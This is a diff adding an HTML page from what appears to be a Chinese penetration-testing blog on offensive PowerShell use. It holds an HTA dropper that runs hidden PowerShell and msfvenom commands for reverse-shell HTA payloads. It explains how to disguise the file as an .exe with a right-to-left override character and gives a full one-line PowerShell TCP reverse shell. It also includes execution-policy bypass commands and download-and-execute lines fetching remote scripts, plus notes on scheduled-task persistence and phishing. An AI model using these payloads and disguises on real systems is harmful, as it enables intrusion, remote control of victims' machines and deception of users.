@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>powershell的利用</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/powershell.html" rel="bookmark"
+           title="Permalink to powershell的利用">powershell的利用</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-05-12T00:00:00+02:00">
+                <a href='#'>05/12/2017 </a>
+                <a href="/category/learning.html">Learning</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <h2>powershell+hta</h2>
+<p><a href="http://www.freebuf.com/sectool/90362.html">http://www.freebuf.com/sectool/90362.html</a></p>
+<p>新建立一个hta文件，比如是如下内容：</p>
+<div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="nv">title</span><span class="o">&gt;</span><span class="nv">XXX</span><span class="o">-</span><span class="nv">exp</span><span class="o">&lt;/</span><span class="nv">title</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nv">center</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nv">h1</span><span class="o">&gt;</span><span class="nv">XXX</span><span class="o">-</span><span class="nv">exp</span>: <span class="nv">death</span>.<span class="nv">exe</span><span class="o">&lt;/</span><span class="nv">h1</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nv">br</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nv">h2</span><span class="o">&gt;</span><span class="nv">Loading</span>...<span class="o">&lt;/</span><span class="nv">h2</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nv">br</span><span class="o">&gt;</span>
+[<span class="o">&lt;</span><span class="nv">marquee</span> <span class="nv">scrollAmount</span><span class="o">=</span><span class="mi">4</span> <span class="nv">width</span><span class="o">=</span><span class="mi">350</span> <span class="nv">direction</span><span class="o">=</span><span class="nv">right</span><span class="o">&gt;|||||||||||||&lt;/</span><span class="nv">marquee</span><span class="o">&gt;</span>]<span class="mi">35</span><span class="o">%</span>
+<span class="o">&lt;</span><span class="nv">br</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="nv">center</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nv">script</span> <span class="nv">language</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">VBScript</span><span class="s2">&quot;</span><span class="o">&gt;</span>
+  <span class="nv">Set</span> <span class="nv">Hackdo</span> <span class="o">=</span> <span class="nv">CreateObject</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">Wscript.Shell</span><span class="s2">&quot;</span><span class="ss">)</span>
+  <span class="nv">Set</span> <span class="nv">Check</span> <span class="o">=</span> <span class="nv">CreateObject</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">Scripting.FileSystemObject</span><span class="s2">&quot;</span><span class="ss">)</span>
+  <span class="k">If</span> <span class="nv">Check</span>.<span class="nv">FileExists</span><span class="ss">(</span><span class="nv">Hackdo</span>.<span class="nv">ExpandEnvironmentStrings</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">%PSModulePath%</span><span class="s2">&quot;</span><span class="ss">)</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="s">..\powershell.exe</span><span class="s2">&quot;</span><span class="ss">)</span> <span class="k">Then</span>
+    <span class="nv">Hackdo</span>.<span class="nv">Run</span> <span class="s2">&quot;</span><span class="s">powershell.exe -nop -w hidden calc.exe</span><span class="s2">&quot;</span>
+  <span class="k">End</span> <span class="k">If</span>
+<span class="o">&lt;/</span><span class="nv">script</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<p>其中windows会执行script标签里面的内容，然后这部分可以替换一个反弹的代码，使用msf生成：</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=175.xxx.xxx.xxx lport=8081 -f hta-psh -o test.hta</code></p>
+<p>或者这样：</p>
+<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.xx.xx.xx  LPORT=5555 -f hta-psh &gt;test.hta</code></p>
+<p>然后把script标签里面的内容拷贝到上面script对应的部分，保存为hta，监听端口之后只要打开hta即可获取shell。</p>
+<p>如果需要运行之后退出，可以这样：</p>
+<p>比如创建了一个hack的<code>Wscript.Shell</code>对象，最后加上这句话
+<code>hack.Run "taskkill /f /im mshta.exe"</code>即可退出，但是session还在等。</p>
+<ul>
+<li>如果获取的是msf的shell，<code>getuid</code>查看当前权限，然后使用<code>ps</code>列出进程可以看到pid和对应的进程名称，然后使用<code>migrate [pid]</code>迁移到对应权限的进程，然后就权限随之改变。</li>
+<li></li>
+</ul>
+<div class="highlight"><pre><span></span><span class="err">这只是个弹计算器的脚本，大可拷贝下来实际操作一遍，拷贝，新建</span><span class="n">txt文档</span><span class="err">，打开，粘贴并保存为名称</span><span class="n">deexe</span><span class="p">.</span><span class="n">hta</span><span class="err">，右键重命名，光标放在</span><span class="n">de和exe</span><span class="p">.</span><span class="n">hta之间点击右键</span><span class="err">，选择插入</span><span class="n">Unicode控制符</span><span class="err">，点击插入</span><span class="n">RLO</span><span class="err">，最后就可以获取一个看起来像</span><span class="n">exe的文件</span>
+</pre></div>
+
+
+<h2>powershell的运行</h2>
+<p>一般情况下系统禁止powershell运行，可以进入powershell之后查看当前系统的策略：</p>
+<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">E</span><span class="p">:</span><span class="o">&gt;</span> <span class="k">Get</span><span class="o">-</span><span class="n">ExecutionPolicy</span>
+<span class="n">Restricted</span>
+<span class="n">PS</span> <span class="n">E</span><span class="p">:</span><span class="o">&gt;</span> <span class="k">Set</span><span class="o">-</span><span class="n">ExecutionPolicy</span> <span class="n">UnRestricted</span>
+</pre></div>
+
+
+<h2>nishang</h2>
+<p><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
+<p>下载之后cmd输入powershell进入ps，然后加载nishang的脚本<code>Import-Module .\nishang.psm1</code></p>
+<p>加载之后就可以使用各种脚本，比如其中的TCP反弹脚本</p>
+<p><code>Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -Port x</code></p>
+<h3>在cmd下如何执行一个反弹脚本</h3>
+<p><code>powershell.exe -file tcp.ps1</code></p>
+<div class="highlight"><pre><span></span><span class="mh">$c</span><span class="nv">lient</span> <span class="o">=</span> <span class="nv">New</span><span class="o">-</span><span class="nv">Object</span> <span class="nv">System</span>.<span class="nv">Net</span>.<span class="nv">Sockets</span>.<span class="nv">TCPClient</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">x.x.x.x</span><span class="s2">&quot;</span>,<span class="mi">8000</span><span class="ss">)</span><span class="c1">;$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</span>
+</pre></div>
+
+
+<p>在实战环境中最好使用如下的方式运行powershell</p>
+<h4>cmd下运行：</h4>
+<p><code>PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File d:\Invoke-PowerShellUdp.ps1</code></p>
+<p><code>PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ip/ps1')</code></p>
+<h4>powershell运行：</h4>
+<p><code>IEX(New-Object Net.WebClient).DownloadString('http://ip/ps1')</code></p>
+<p>＝＝＝＝</p>
+<p>第一篇：
+windows 定时任务反弹shell
+https://support.microsoft.com/zh-cn/help/313565/how-to-use-the-at-command-to-schedule-tasks<br>
+https://www.kancloud.cn/summer/windows_schtasks/77988  定时任务
+windows的定时任务结合dnscat2，不用配置域名服务器，直接链接服务器。
+http://wooyun.jozxing.cc/static/drops/tips-6090.html  powershell反弹姿势
+(New-Object System.Net.Webclient).DownloadFile("http://127.0.0.1/kms.txt","D:\1.txt") powershell下载文件
+http://www.freebuf.com/articles/system/93829.html  powsershell绕过限制策略
+at定时任务下载执行反弹脚本，不用下载到硬盘 最后只需要一个定时任务即可
+regsvr32 /s /u ms17010.dll  执行dll文件
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')" 网上下载并且执行ps脚本
+http://www.freebuf.com/sectool/89918.html 有一个一行的TCP反弹脚本
+http://www.freebuf.com/sectool/90191.html  UDP反弹脚本</p>
+<p>PowerShell.exe -ExecutionPolicy Bypass -File .\script.ps1 powershell这样执行
+实战环境中可以这样：
+PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File d:\Invoke-PowerShellUdp.ps1</p>
+<p>-nop -w hidden 后，能强行绕过UAC执行命令。 
+http://www.freebuf.com/sectool/90362.html powershell+ hta
+http://blog.zer01.net/?p=65 powershell在渗透过程中的使用方法
+https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 TCP的ps反弹脚本
+https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 nc的powershell
+http://0cx.cc/about_powershell.jspx 各种各样的反弹脚本
+http://www.freebuf.com/sectool/131275.html</p>
+<p>C:\Inetpub\AdminScrip
+cscript.exe adsutil.vbs enum w3svc/1/root”，看看Web服务器的配置</p>
+<p>第二篇：php－fpm的原理</p>
+<p>第三篇：使用email或者chm等钓鱼
+https://evi1cg.me/archives/Powershell_client.html powershell钓鱼</p>
+<p><a href="https://improsec.com/blog//babushka-dolls-or-how-to-bypass-application-whitelisting-and-constrained-powershell">https://improsec.com/blog//babushka-dolls-or-how-to-bypass-application-whitelisting-and-constrained-powershell</a></p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
